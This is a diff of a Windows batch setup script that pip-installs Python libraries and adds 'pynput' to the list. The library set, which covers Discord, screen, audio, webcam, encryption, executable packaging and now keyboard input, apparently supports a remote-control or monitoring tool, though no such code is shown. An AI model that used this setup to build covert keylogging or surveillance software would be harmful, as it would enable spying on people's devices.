@@ -1,6 +1,6 @@
 @echo off
 
-pip install discord.py psutil pyautogui pyaudio opencv-python pycryptodome imageio pyinstaller
+pip install discord.py psutil pyautogui pyaudio opencv-python pycryptodome imageio pyinstaller pynput
 
 pause
 
